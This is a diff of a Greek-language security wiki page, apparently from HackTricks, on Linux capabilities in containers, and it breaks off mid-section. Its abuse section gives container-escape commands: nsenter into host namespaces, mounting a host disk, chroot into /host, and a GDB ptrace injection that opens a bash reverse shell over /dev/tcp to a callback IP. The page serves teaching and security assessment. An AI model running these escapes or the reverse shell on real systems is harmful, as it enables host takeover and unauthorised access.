@@ -1,14 +1,14 @@
-# Linux Capabilities Σε Containers
+# Δυνατότητες Linux σε Containers
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 ## Επισκόπηση
 
-Τα Linux capabilities είναι ένα από τα σημαντικότερα στοιχεία του container security, επειδή απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά το "root" μέσα σε ένα container;** Σε ένα κανονικό Linux system, το UID 0 ιστορικά συνεπαγόταν ένα πολύ ευρύ σύνολο προνομίων. Στους σύγχρονους kernels, αυτό το προνόμιο αποσυντίθεται σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να εκτελείται ως root και παρ' όλα αυτά να στερείται πολλές ισχυρές λειτουργίες, αν έχουν αφαιρεθεί τα σχετικά capabilities. <sup>[[1]](#references)</sup>
+Οι δυνατότητες Linux είναι ένα από τα σημαντικότερα στοιχεία της ασφάλειας των containers, επειδή απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά το «root» μέσα σε ένα container;** Σε ένα συνηθισμένο σύστημα Linux, το UID 0 ιστορικά συνεπαγόταν ένα πολύ ευρύ σύνολο προνομίων. Στους σύγχρονους kernels, αυτά τα προνόμια διαχωρίζονται σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να εκτελείται ως root και παρ’ όλα αυτά να μην μπορεί να εκτελέσει πολλές ισχυρές λειτουργίες, αν έχουν αφαιρεθεί οι σχετικές capabilities. <sup>[[1]](#references)</sup>
 
-Τα Containers βασίζονται σε μεγάλο βαθμό σε αυτή τη διάκριση. Πολλά workloads εξακολουθούν να εκκινούν ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς την αφαίρεση capabilities, αυτό θα ήταν υπερβολικά επικίνδυνο. Με την αφαίρεση capabilities, μια διεργασία root μέσα σε container μπορεί να εκτελεί πολλές συνηθισμένες εργασίες στο container, ενώ της απαγορεύεται η εκτέλεση πιο ευαίσθητων λειτουργιών του kernel. Γι' αυτό ένα shell σε container που εμφανίζει `uid=0(root)` δεν σημαίνει αυτόματα "host root" ή ακόμη και "ευρύ kernel privilege". Τα capability sets καθορίζουν πόση αξία έχει στην πράξη αυτή η ταυτότητα root.
+Τα containers βασίζονται σε μεγάλο βαθμό σε αυτή τη διάκριση. Πολλά workloads εξακολουθούν να εκκινούνται ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς την αφαίρεση capabilities, αυτό θα ήταν υπερβολικά επικίνδυνο. Όταν αφαιρούνται capabilities, μια διεργασία root μέσα σε container μπορεί να εξακολουθεί να εκτελεί πολλές συνηθισμένες εργασίες εντός του container, ενώ δεν της επιτρέπονται πιο ευαίσθητες λειτουργίες του kernel. Γι’ αυτό, ένα shell σε container που εμφανίζει `uid=0(root)` δεν σημαίνει αυτόματα «root στο host» ή ακόμη και «ευρεία πρόσβαση στον kernel». Τα σύνολα capabilities καθορίζουν πόση πραγματική ισχύ έχει αυτή η ταυτότητα root.
 
-Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα abuse, δείτε:
+Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα κατάχρησής τους, δείτε:
 
 {{#ref}}
 ../../../interesting-files-permissions/linux-capabilities.md
@@ -16,61 +16,68 @@
 
 ## Λειτουργία
 
-Τα capabilities παρακολουθούνται σε πολλά sets, όπως τα permitted, effective, inheritable, ambient και bounding sets. Για πολλές αξιολογήσεις container, τα ακριβή semantics του kernel για κάθε set είναι λιγότερο σημαντικά άμεσα από το πρακτικό ερώτημα: **ποιες privileged λειτουργίες μπορεί να εκτελέσει με επιτυχία αυτή η διεργασία τώρα και ποια μελλοντικά privilege gains είναι ακόμη δυνατά;** <sup>[[1]](#references)</sup>
+Οι capabilities παρακολουθούνται σε διάφορα σύνολα, όπως τα permitted, effective, inheritable, ambient και bounding sets. Σε πολλές αξιολογήσεις containers, η ακριβής σημασιολογία κάθε συνόλου στον kernel είναι λιγότερο σημαντική από το τελικό πρακτικό ερώτημα: **ποιες προνομιούχες λειτουργίες μπορεί να εκτελέσει επιτυχώς αυτή η διεργασία τώρα και ποια μελλοντική απόκτηση προνομίων εξακολουθεί να είναι δυνατή;** <sup>[[1]](#references)</sup>
 
-Ο λόγος που αυτό έχει σημασία είναι ότι πολλές breakout techniques είναι στην πραγματικότητα προβλήματα capabilities που εμφανίζονται ως προβλήματα containers. Ένα workload με `CAP_SYS_ADMIN` μπορεί να αποκτήσει πρόσβαση σε τεράστιο μέρος της λειτουργικότητας του kernel που μια κανονική root διεργασία σε container δεν θα έπρεπε να αγγίζει. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν μοιράζεται επίσης το host network namespace. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να δει host processes μέσω host PID sharing. Στο Docker ή το Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, ενώ στο Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.
+Αυτό έχει σημασία επειδή πολλές τεχνικές απόδρασης από container είναι στην πραγματικότητα προβλήματα capabilities που μεταμφιέζονται σε προβλήματα containers. Ένα workload με `CAP_SYS_ADMIN` μπορεί να αποκτήσει πρόσβαση σε τεράστιο μέρος των λειτουργιών του kernel, τις οποίες μια συνηθισμένη διεργασία root σε container δεν θα έπρεπε να χρησιμοποιεί. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν μοιράζεται επίσης το network namespace του host. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να βλέπει διεργασίες του host μέσω κοινής χρήσης του PID namespace του host. Στα Docker ή Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`· στο Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.
 
-Με άλλα λόγια, το capability set δεν μπορεί να αξιολογηθεί μεμονωμένα. Πρέπει να εξετάζεται μαζί με τα namespaces, το seccomp και την MAC policy.
+Με άλλα λόγια, το σύνολο capabilities δεν μπορεί να αξιολογηθεί μεμονωμένα. Πρέπει να εξετάζεται σε συνδυασμό με τα namespaces, το seccomp και την πολιτική MAC.
 
-## Lab
+## Εργαστήριο
 
-Ένας πολύ άμεσος τρόπος για να ελέγξετε τα capabilities μέσα σε ένα container είναι:
+Ένας πολύ άμεσος τρόπος για να ελέγξετε τις capabilities μέσα σε ένα container είναι:
+
 ```bash
 docker run --rm -it debian:stable-slim bash
 apt-get update && apt-get install -y libcap2-bin
 capsh --print
 ```
-Μπορείτε επίσης να συγκρίνετε ένα πιο περιορισμένο container με ένα στο οποίο έχουν προστεθεί όλες οι capabilities:
+
+Μπορείτε επίσης να συγκρίνετε ένα πιο περιοριστικό container με ένα στο οποίο έχουν προστεθεί όλα τα capabilities:
+
 ```bash
 docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
-Για να δείτε την επίδραση μιας στοχευμένης προσθήκης, δοκιμάστε να αφαιρέσετε τα πάντα και να προσθέσετε ξανά μόνο ένα capability:
+
+Για να δείτε την επίδραση μιας περιορισμένης προσθήκης, δοκιμάστε να απορρίψετε τα πάντα και να προσθέσετε ξανά μόνο μία capability:
+
 ```bash
 docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
-Αυτά τα μικρά πειράματα βοηθούν να φανεί ότι ένα runtime δεν ενεργοποιεί απλώς ένα boolean που ονομάζεται "privileged". Διαμορφώνει την πραγματική επιφάνεια προνομίων που είναι διαθέσιμη στη διεργασία.
 
-## Capabilities υψηλού κινδύνου
+Αυτά τα μικρά πειράματα βοηθούν να φανεί ότι ένα runtime δεν αλλάζει απλώς την τιμή ενός boolean με όνομα «privileged». Διαμορφώνει την πραγματική επιφάνεια προνομίων που είναι διαθέσιμη στη διεργασία.
 
-Οι capabilities γίνονται primitives για escape μόνο όταν η λειτουργία τους φτάνει σε έναν **host-governed resource**. Οι επαναλαμβανόμενοι συνδυασμοί υψηλού κινδύνου είναι:
+## Capabilities Υψηλού Κινδύνου
 
-- **`CAP_SYS_ADMIN`** σε συνδυασμό με host PID, block device ή writable kernel-control path. Η είσοδος σε ένα target mount namespace απαιτεί επιπλέον `CAP_SYS_CHROOT`, ενώ το mounting ενός block-based filesystem απαιτεί `CAP_SYS_ADMIN` στο initial user namespace.
-- **`CAP_SYS_PTRACE`** σε συνδυασμό με ορατότητα host PID και μια attachable host process. Το `CAP_SYS_ADMIN` δεν απαιτείται για ptrace injection.
-- **`CAP_DAC_OVERRIDE` ή `CAP_DAC_READ_SEARCH`** σε συνδυασμό με προσβάσιμο host filesystem. Αυτές οι capabilities παρακάμπτουν διαφορετικούς DAC ελέγχους, αλλά δεν δημιουργούν host filesystem view.
-- **`CAP_SYS_MODULE`** στο initial user namespace σε συνδυασμό με ένα αποδεκτό, kernel-compatible module. Τα συνηθισμένα Linux containers μοιράζονται τον node kernel· τα VM ή userspace-kernel runtimes αλλάζουν αυτό το boundary.
-- **`CAP_MKNOD`** στο initial user namespace σε συνδυασμό με ένα πραγματικό host device που επιτρέπεται ήδη από το device cgroup. Η δημιουργία ενός node δεν παρακάμπτει το device cgroup.
-- **`CAP_SYS_RAWIO`** σε συνδυασμό με exposed και usable memory, I/O-port, PCI ή device-control interface.
-- **`CAP_SYS_BOOT`** σε συνδυασμό με το initial PID namespace για host reboot ή με ένα usable και permitted kexec path για kernel replacement.
-- **`CAP_NET_ADMIN`** στο host network namespace για άμεσο έλεγχο του network state του node. Το **`CAP_NET_RAW`** μπορεί να συμμετέχει σε protocol-specific escape, αλλά τα raw sockets από μόνα τους δεν αποτελούν node shell.
+Τα capabilities γίνονται primitives διαφυγής μόνο όταν η λειτουργία τους φτάνει σε έναν **πόρο που ελέγχεται από το host**. Οι συνδυασμοί υψηλού κινδύνου που εμφανίζονται συχνότερα είναι:
 
-Το `CAP_SYS_CHROOT` δεν περιλαμβάνεται σκόπιμα ως standalone escape capability. Μπορεί να απαιτείται από το `setns()` σε mount namespace και να κάνει ευκολότερη τη χρήση ενός ήδη προσβάσιμου host tree, αλλά το `chroot()` από μόνο του ούτε εκθέτει αυτό το tree ούτε παρέχει νέα filesystem permissions. Παρομοίως, τα `CAP_BPF` και `CAP_PERFMON` εκθέτουν ισχυρό telemetry και kernel attack surface, αλλά χωρίς ξεχωριστό kernel flaw οι συνηθισμένες λειτουργίες τους δεν αποτελούν generic container escapes.
+- **`CAP_SYS_ADMIN`** μαζί με ένα host PID, μια συσκευή block ή μια διαδρομή εγγραφής σε στοιχεία ελέγχου του kernel. Για την ένταξη σε ένα target mount namespace απαιτείται επιπλέον το `CAP_SYS_CHROOT`· για την προσάρτηση ενός filesystem που βασίζεται σε block απαιτείται το `CAP_SYS_ADMIN` στο αρχικό user namespace.
+- **`CAP_SYS_PTRACE`** μαζί με ορατότητα στα host PID και μια host διεργασία στην οποία μπορεί να γίνει attach. Το `CAP_SYS_ADMIN` δεν απαιτείται για ptrace injection.
+- **`CAP_DAC_OVERRIDE` ή `CAP_DAC_READ_SEARCH`** μαζί με πρόσβαση σε ένα host filesystem. Αυτά τα capabilities παρακάμπτουν διαφορετικούς ελέγχους DAC, αλλά δεν δημιουργούν ορατότητα σε host filesystem.
+- **`CAP_SYS_MODULE`** στο αρχικό user namespace μαζί με ένα αποδεκτό module συμβατό με τον kernel. Τα συνηθισμένα Linux containers μοιράζονται τον kernel του node· τα runtimes VM ή userspace-kernel αλλάζουν αυτό το όριο.
+- **`CAP_MKNOD`** στο αρχικό user namespace μαζί με μια πραγματική host συσκευή την οποία επιτρέπει ήδη το device cgroup. Η δημιουργία ενός node δεν παρακάμπτει το device cgroup.
+- **`CAP_SYS_RAWIO`** μαζί με ένα εκτεθειμένο και λειτουργικό interface μνήμης, θυρών I/O, PCI ή ελέγχου συσκευών.
+- **`CAP_SYS_BOOT`** μαζί με το αρχικό PID namespace για επανεκκίνηση του host ή με μια λειτουργική και επιτρεπόμενη διαδρομή kexec για αντικατάσταση του kernel.
+- **`CAP_NET_ADMIN`** στο host network namespace για άμεσο έλεγχο της κατάστασης δικτύου του node. Το **`CAP_NET_RAW`** μπορεί να συμμετέχει σε escape συγκεκριμένου πρωτοκόλλου, αλλά τα raw sockets από μόνα τους δεν παρέχουν shell στο node.
 
-## Χρήση από Runtime
+Το `CAP_SYS_CHROOT` δεν αναφέρεται σκόπιμα ως αυτόνομο capability διαφυγής. Μπορεί να απαιτείται από το `setns()` σε mount namespace και να διευκολύνει τη χρήση ενός host tree στο οποίο υπάρχει ήδη πρόσβαση, αλλά το `chroot()` από μόνο του ούτε εκθέτει αυτό το tree ούτε παρέχει νέα δικαιώματα filesystem. Παρομοίως, τα `CAP_BPF` και `CAP_PERFMON` εκθέτουν ισχυρές δυνατότητες telemetry και επιφάνεια επίθεσης του kernel, αλλά, χωρίς ξεχωριστό kernel flaw, οι συνήθεις λειτουργίες τους δεν αποτελούν γενικούς τρόπους διαφυγής από container.
 
-Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O χρησιμοποιούν όλα capability controls, αλλά τα defaults και τα management interfaces διαφέρουν. Το Docker τα εκθέτει απευθείας μέσω flags όπως `--cap-drop` και `--cap-add`. Το Podman εκθέτει παρόμοια controls και συνήθως τα συνδυάζει με rootless execution ως επιπλέον safety layer. Το Kubernetes εμφανίζει capability additions και drops μέσω του `securityContext` του Pod ή του container· τα lower-level runtimes εκφράζουν τα resulting sets στο OCI runtime configuration. Τα system-container environments όπως τα LXC και Incus βασίζονται επίσης σε capability control, αλλά η ευρύτερη host integration τους μπορεί να ωθήσει τους operators να χαλαρώσουν τα defaults πιο επιθετικά απ’ ό,τι θα έκαναν για ένα application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>
+## Χρήση από Runtimes
 
-Η ίδια αρχή ισχύει για όλα: μια capability που είναι τεχνικά δυνατό να δοθεί δεν είναι απαραίτητα capability που πρέπει να δοθεί. Πολλά πραγματικά incidents ξεκινούν όταν ένας operator προσθέτει μια capability απλώς επειδή ένα workload απέτυχε υπό αυστηρότερο configuration και η ομάδα χρειαζόταν μια γρήγορη λύση.
+Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O χρησιμοποιούν όλα ελέγχους capabilities, αλλά οι προεπιλογές και τα interfaces διαχείρισης διαφέρουν. Το Docker τα εκθέτει απευθείας μέσω flags όπως τα `--cap-drop` και `--cap-add`. Το Podman παρέχει παρόμοιους ελέγχους και συχνά τους συνδυάζει με rootless εκτέλεση ως πρόσθετο επίπεδο ασφάλειας. Το Kubernetes παρέχει προσθήκες και αφαιρέσεις capabilities μέσω του `securityContext` του Pod ή του container· τα runtimes χαμηλότερου επιπέδου αποτυπώνουν τα resulting sets στη διαμόρφωση runtime του OCI. Τα περιβάλλοντα system-container, όπως τα LXC και Incus, βασίζονται επίσης στον έλεγχο capabilities, αλλά η ευρύτερη ενσωμάτωσή τους με το host μπορεί να δελεάσει τους operators να χαλαρώσουν τις προεπιλογές περισσότερο απ’ ό,τι θα έκαναν για ένα application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>
 
-## Λανθασμένες ρυθμίσεις
+Η ίδια αρχή ισχύει για όλα: το ότι είναι τεχνικά δυνατό να δοθεί ένα capability δεν σημαίνει απαραίτητα ότι πρέπει να δοθεί. Πολλά περιστατικά στον πραγματικό κόσμο ξεκινούν όταν ένας operator προσθέτει ένα capability απλώς επειδή ένα workload απέτυχε με αυστηρότερη διαμόρφωση και η ομάδα χρειαζόταν μια γρήγορη λύση.
 
-Το πιο προφανές λάθος είναι το **`--cap-add=ALL`** σε CLIs τύπου Docker/Podman, αλλά δεν είναι το μόνο. Στην πράξη, πιο συνηθισμένο πρόβλημα είναι η παραχώρηση μίας ή δύο εξαιρετικά ισχυρών capabilities, ιδιαίτερα του `CAP_SYS_ADMIN`, για να "λειτουργήσει η εφαρμογή", χωρίς παράλληλη κατανόηση των επιπτώσεων σε namespaces, seccomp και mounts. Ένα ακόμη συνηθισμένο failure mode είναι ο συνδυασμός extra capabilities με host namespace sharing. Στο Docker ή το Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, `--network=host` ή `--userns=host`· στο Kubernetes η αντίστοιχη έκθεση εμφανίζεται συνήθως μέσω workload settings όπως `hostPID: true` ή `hostNetwork: true`. Κάθε ένας από αυτούς τους συνδυασμούς αλλάζει το τι μπορεί πραγματικά να επηρεάσει η capability.
+## Λανθασμένες Διαμορφώσεις
 
-Είναι επίσης συνηθισμένο οι administrators να πιστεύουν ότι, επειδή ένα workload δεν είναι πλήρως `--privileged`, εξακολουθεί να είναι ουσιαστικά περιορισμένο. Μερικές φορές αυτό ισχύει, αλλά μερικές φορές το effective posture βρίσκεται ήδη αρκετά κοντά στο privileged, ώστε η διάκριση να παύει να έχει operational σημασία.
+Το πιο προφανές λάθος είναι το **`--cap-add=ALL`** σε CLIs τύπου Docker/Podman, αλλά δεν είναι το μόνο. Στην πράξη, συχνότερο πρόβλημα είναι η παραχώρηση ενός ή δύο εξαιρετικά ισχυρών capabilities, ειδικά του `CAP_SYS_ADMIN`, για να «λειτουργήσει η εφαρμογή», χωρίς να λαμβάνονται υπόψη οι επιπτώσεις στα namespaces, στο seccomp και στα mounts. Ένα άλλο συνηθισμένο πρόβλημα είναι ο συνδυασμός πρόσθετων capabilities με κοινή χρήση host namespaces. Στα Docker ή Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, `--network=host` ή `--userns=host`· στο Kubernetes, η αντίστοιχη έκθεση εμφανίζεται συνήθως μέσω ρυθμίσεων workload όπως οι `hostPID: true` ή `hostNetwork: true`. Κάθε τέτοιος συνδυασμός αλλάζει το τι μπορεί πραγματικά να επηρεάσει το capability.
 
-## Abuse
+Είναι επίσης συνηθισμένο οι διαχειριστές να πιστεύουν ότι, επειδή ένα workload δεν είναι πλήρως `--privileged`, εξακολουθεί να υπόκειται σε ουσιαστικούς περιορισμούς. Μερικές φορές ισχύει, αλλά άλλες φορές η πραγματική κατάσταση είναι ήδη τόσο κοντά στο privileged, ώστε η διάκριση παύει να έχει λειτουργική σημασία.
 
-Ξεκινήστε καταγράφοντας τα effective sets, το user-namespace mapping, την κατάσταση του seccomp, τα namespaces, τα mounts και τα devices. Ένα όνομα capability χωρίς αυτό το context δεν αποδεικνύει escape:
+## Κατάχρηση
+
+Ξεκινήστε καταγράφοντας τα ενεργά sets, την αντιστοίχιση user namespace, την κατάσταση του seccomp, τα namespaces, τα mounts και τις συσκευές. Ένα όνομα capability χωρίς αυτό το πλαίσιο δεν αποδεικνύει διαφυγή:
+
 ```bash
 capsh --print
 grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
@@ -78,32 +85,40 @@ cat /proc/self/uid_map /proc/self/gid_map
 ls -l /proc/self/ns
 findmnt
 ```
-### `CAP_SYS_ADMIN`: namespaces και block devices
 
-Με ορατότητα των PID του host, το `CAP_SYS_ADMIN` μπορεί να εισέλθει στα namespaces του host. Η λειτουργία mount-namespace απαιτεί επίσης `CAP_SYS_CHROOT` στο user namespace του caller.
+### `CAP_SYS_ADMIN`: namespaces και συσκευές block
 
-**Ελέγξτε το capability και το confinement:**
+Με ορατότητα στα PID του host, το `CAP_SYS_ADMIN` μπορεί να εισέλθει στα namespaces του host. Η λειτουργία mount namespace χρειάζεται επίσης `CAP_SYS_CHROOT` στο user namespace του καλούντος.
+
+**Έλεγχος του capability και του confinement:**
+
 ```bash
 capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map /proc/self/gid_map
 ```
-**Καταγράψτε το target:** επιβεβαιώστε το host PID sharing από τη διαμόρφωση του container/Pod ή από μια unmistakable λίστα διεργασιών του host και, στη συνέχεια, ελέγξτε τα namespaces του target. Ένα τοπικό PID 1 υπάρχει και στα private PID namespaces, επομένως η παρουσία του από μόνη της δεν αποδεικνύει το host PID sharing.
+
+**Καταγράψτε τον στόχο:** επιβεβαιώστε την κοινή χρήση του PID του host από τη διαμόρφωση του container/Pod ή από μια αναμφισβήτητη λίστα διεργασιών του host και, στη συνέχεια, επιθεωρήστε τα namespaces του στόχου. Υπάρχει τοπικό PID 1 και σε ιδιωτικά PID namespaces, επομένως η παρουσία του από μόνη της δεν αποδεικνύει κοινή χρήση του PID του host.
+
 ```bash
 ps -eo pid,user,comm,args
 target_pid=1
 tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
 ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
 ```
-**Εκμεταλλευτείτε τη διαδρομή του namespace:**
+
+**Εκμεταλλευτείτε τη διαδρομή namespace:**
+
 ```bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
 id
 findmnt /
 ```
-Οι έλεγχοι των capabilities πρέπει να είναι επιτυχείς στα user namespaces που είναι κάτοχοι των targets. Το `--pid=host` ή το Kubernetes `hostPID: true` παρέχει visibility· δεν παρέχει τα capabilities.
 
-Για το alternative block-device path, **enumerate** τους candidates και, στη συνέχεια, **exploit** το προσβάσιμο filesystem κάνοντας πρώτα mount τον validated candidate ως read-only:
+Οι έλεγχοι capabilities πρέπει να πετυχαίνουν στα user namespaces που έχουν στην κατοχή τους τους στόχους. Το `--pid=host` ή το Kubernetes `hostPID: true` παρέχει ορατότητα· δεν παρέχει τα capabilities.
+
+Για την εναλλακτική διαδρομή block-device, **enumerate** τους υποψήφιους και έπειτα **exploit** το προσβάσιμο filesystem κάνοντας πρώτα mount τον επικυρωμένο υποψήφιο μόνο για ανάγνωση:
+
 ```bash
 lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
 node_root_device=/dev/vda1  # Replace with the validated candidate.
@@ -112,43 +127,53 @@ mount -o ro "${node_root_device}" /mnt/hostdisk
 cat /mnt/hostdisk/etc/hostname
 umount /mnt/hostdisk
 ```
-Ο κόμβος συσκευής πρέπει να υπάρχει, το device cgroup πρέπει να το επιτρέπει και τα block-filesystem mounts απαιτούν `CAP_SYS_ADMIN` στο αρχικό user namespace. Ένα host root που έχει ήδη γίνει bind-mounted στο `/host` παρέχει πρόσβαση στο host **χωρίς** `CAP_SYS_ADMIN`· το `chroot /host` είναι απλώς μια διευκόλυνση και απαιτεί ξεχωριστά `CAP_SYS_CHROOT`.
 
-### Προσβάσιμο host root: άμεση εκτέλεση filesystem
+Ο κόμβος συσκευής πρέπει να υπάρχει, το device cgroup πρέπει να το επιτρέπει και οι προσαρτήσεις block filesystem απαιτούν `CAP_SYS_ADMIN` στο αρχικό user namespace. Αν το root του host έχει ήδη προσαρτηθεί με bind στο `/host`, υπάρχει πρόσβαση στον host **χωρίς** `CAP_SYS_ADMIN`· το `chroot /host` είναι απλώς μια διευκόλυνση και απαιτεί ξεχωριστά `CAP_SYS_CHROOT`.
 
-Αν το host root έχει ήδη γίνει mount στο `/host`, επιβεβαιώστε πρώτα το mount και στη συνέχεια χρησιμοποιήστε απευθείας την υπάρχουσα πρόσβαση. Αυτή η διαδρομή δεν εξαρτάται από το `CAP_SYS_ADMIN`:
+### Προσβάσιμο root του host: άμεση εκτέλεση από το filesystem
+
+Αν το root του host έχει ήδη προσαρτηθεί στο `/host`, επιβεβαίωσε πρώτα την προσάρτηση και μετά χρησιμοποίησε απευθείας την υπάρχουσα πρόσβαση. Αυτή η διαδρομή δεν εξαρτάται από το `CAP_SYS_ADMIN`:
+
 ```bash
 findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
 ls -la /host
 chroot /host /bin/bash
 ```
-Εάν το `chroot()` δεν είναι διαθέσιμο, αλλά το δυαδικό αρχείο του host είναι συμβατό με την αρχιτεκτονική και τον loader του container, συχνά μπορεί να κληθεί μέσω του προσαρτημένου δέντρου:
+
+Αν το `chroot()` δεν είναι διαθέσιμο, αλλά το δυαδικό αρχείο του host είναι συμβατό με την αρχιτεκτονική και τον φορτωτή του container, συχνά μπορεί να κληθεί μέσω του προσαρτημένου δέντρου:
+
 ```bash
 /host/bin/bash -p
 export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
 ```
-Οι άμεσες αναγνώσεις και εγγραφές κάτω από το `/host` αποτελούν ήδη παραβίαση του filesystem του host. Το `chroot()` ή η εκτέλεση ενός binary του host απλώς κάνουν αυτή την πρόσβαση πιο εύκολη· καμία από τις δύο λειτουργίες δεν δημιουργεί το mount του host ούτε παρακάμπτει ένα read-only mount ή μια πολιτική MAC.
 
-### `CAP_SYS_PTRACE`: injection σε διεργασία του host
+Οι άμεσες αναγνώσεις και εγγραφές στο `/host` συνιστούν ήδη παραβίαση του host filesystem. Το `chroot()` ή η εκτέλεση ενός host binary απλώς διευκολύνουν αυτή την πρόσβαση· καμία από τις δύο ενέργειες δεν προσαρτά το host ούτε παρακάμπτει ένα read-only mount ή μια πολιτική MAC.
 
-Με ορατότητα PID του host και `CAP_SYS_PTRACE` στο user namespace του target, το GDB μπορεί να κάνει μια εγκεκριμένη διεργασία του host να καλέσει τη `system()`. Το `CAP_SYS_ADMIN` δεν απαιτείται.
+### `CAP_SYS_PTRACE`: host-process injection
 
-**Έλεγχος του capability και των στοιχείων ελέγχου attachment:**
+Με ορατότητα στις διεργασίες του host και `CAP_SYS_PTRACE` στο user namespace του στόχου, το GDB μπορεί να κάνει μια εγκεκριμένη διεργασία του host να καλέσει τη `system()`. Δεν απαιτείται `CAP_SYS_ADMIN`.
+
+**Έλεγχος του capability και των στοιχείων ελέγχου προσάρτησης:**
+
 ```bash
 capsh --print | grep cap_sys_ptrace
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
 ```
-**Απαριθμήστε και επιλέξτε έναν disposable στόχο:** επιβεβαιώστε την κοινή χρήση των host PID από τη διαμόρφωση ή από μια unmistakable λίστα διεργασιών του node· μην επιλέξετε ποτέ το PID 1 ή έναν critical daemon.
+
+**Καταγράψτε και επιλέξτε έναν αναλώσιμο στόχο:** επιβεβαιώστε από τη διαμόρφωση ή από μια σαφή λίστα διεργασιών του node ότι γίνεται κοινή χρήση των PID του host· μην επιλέξετε ποτέ το PID 1 ή μια κρίσιμη υπηρεσία.
+
 ```bash
 ps -eo pid,user,comm,args
 target_pid=<approved-lab-process-pid>
 readlink "/proc/${target_pid}/exe"
 grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
-"/proc/${target_pid}/status"
+  "/proc/${target_pid}/status"
 ```
-**Εκμεταλλευτείτε την επιλεγμένη διεργασία:**
+
+**Exploit την επιλεγμένη διεργασία:**
+
 ```bash
 # On a reachable assessment system:
 nc -lvnp 4444
@@ -157,81 +182,99 @@ nc -lvnp 4444
 callback_ip=192.0.2.10
 callback_port=4444
 gdb -q -nx -batch -p "${target_pid}" \
--ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
--ex detach
+  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
+  -ex detach
 ```
-Ο στόχος πρέπει να επιτρέπει τη σύνδεση και να διαθέτει χρησιμοποιήσιμο σύμβολο `system()` και διαδρομή Bash payload. Τα Yama, non-dumpable state, seccomp, τα user namespaces και η MAC policy μπορούν να μπλοκάρουν την αλυσίδα. Το GDB σταματά τον στόχο όσο είναι συνδεδεμένο, επομένως χρησιμοποιήστε μόνο μια disposable διεργασία σε lab.
 
-### `CAP_DAC_OVERRIDE` και `CAP_DAC_READ_SEARCH`: προστατευμένα αρχεία host
+Ο στόχος πρέπει να επιτρέπει attach και να διαθέτει αξιοποιήσιμο σύμβολο `system()` και διαδρομή Bash payload. Τα Yama, non-dumpable state, seccomp, user namespaces και MAC policy μπορούν να εμποδίσουν την αλυσίδα. Το GDB σταματά τον στόχο όσο είναι attached, οπότε χρησιμοποιήστε μόνο μια προσωρινή εργαστηριακή διεργασία.
 
-Αυτές οι capabilities δεν εκθέτουν το filesystem του host. Αν το `/host` είναι ήδη mount του host, το `CAP_DAC_READ_SEARCH` μπορεί να παρακάμψει τους ελέγχους DAC για ανάγνωση/αναζήτηση και το `CAP_DAC_OVERRIDE` μπορεί επιπλέον να παρακάμψει τους συνήθεις ελέγχους εγγραφής:
+### `CAP_DAC_OVERRIDE` και `CAP_DAC_READ_SEARCH`: προστατευμένα αρχεία του host
 
-**Έλεγχος των capabilities:**
+Αυτές οι capabilities δεν εκθέτουν το filesystem του host. Αν το `/host` είναι ήδη mount του host, η `CAP_DAC_READ_SEARCH` μπορεί να παρακάμψει τους ελέγχους DAC για ανάγνωση/αναζήτηση και η `CAP_DAC_OVERRIDE` μπορεί επιπλέον να παρακάμψει τους συνήθεις ελέγχους εγγραφής:
+
+**Ελέγξτε τις capabilities:**
+
 ```bash
 capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 ```
-**Απαριθμήστε το εκτεθειμένο filesystem του host και τα permissions του στόχου:**
+
+**Καταγράψτε το εκτεθειμένο σύστημα αρχείων του host και τα δικαιώματα του στόχου:**
+
 ```bash
